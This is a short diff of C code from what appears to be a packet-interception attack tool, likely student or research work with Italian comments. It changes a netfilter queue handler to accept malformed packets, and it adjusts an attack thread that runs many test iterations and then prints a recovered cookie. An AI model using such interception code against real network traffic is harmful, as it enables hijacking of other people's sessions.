@@ -309,9 +309,12 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
         printf("Printing of the data \n");
         print_application_data(application_payload, application_payload_size);
 
-        if(check_data_length(application_payload, application_payload_size) == false){
+        if(check_data_length(application_payload, application_payload_size) == false){ 
           fprintf(stderr, "Data length is not correct! \n");
-          return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
+          //return nfq_set_verdict(qh, id, NF_DROP, 0, NULL); 
+
+          //devo accettare il pacchetto perchè potrebbe essere che venga spezzato a causa della congestione di rete
+          return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
         }
 
         //ALLOCAZIONE ED INIZIALIZZAZIONE DEL PACCHETTO DATA_LENGTH (VARIABILE GLOBALE) E DEI SUOI CAMPI (IP HEADER, TCP HEADER, APPLICATION DATA)
@@ -575,11 +578,8 @@ void send_modified_packet(uint64_t *start){
 
 //thread function to perform attack
 void *do_attack_thread(void *arg){
-    // 1. FORZIAMO LA FASE 2 FIN DAL PRIMO PACCHETTO
   bool first_attack = false; 
   unsigned int n_attemps = 0;
-  
-  // 2. IMPOSTIAMO UN NUMERO DI TEST ALTO PER BATTERE IL RUMORE
   unsigned long int L_TEST = 50000; 
 
   struct attack_result *a_result = calloc(1, sizeof(struct attack_result));
@@ -672,11 +672,10 @@ void *do_attack_thread(void *arg){
     attack = false;
   }
 
-  // --- PULIZIA DELLA MEMORIA E CHIUSURA ---
   printf("\nEseguo la pulizia della memoria...\n");
   stampa_cookie();
 
-  // (fa_result non c'è più in questo test veloce, quindi non serve liberarlo)
+  // in this test there isn't fa_result 
   free(a_result);
   
   if (original_packet != NULL) {
